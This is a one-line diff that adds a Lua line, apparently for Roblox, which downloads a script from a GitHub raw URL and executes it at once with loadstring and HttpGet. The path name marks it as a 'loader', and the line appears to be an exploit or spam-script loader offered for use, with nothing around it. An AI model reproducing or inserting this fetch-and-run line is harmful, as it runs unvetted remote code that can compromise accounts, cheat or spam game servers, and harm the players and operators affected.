@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/upd-8-cvr-retro-spam5-dlwt0e93fzyxl5.lua"))()
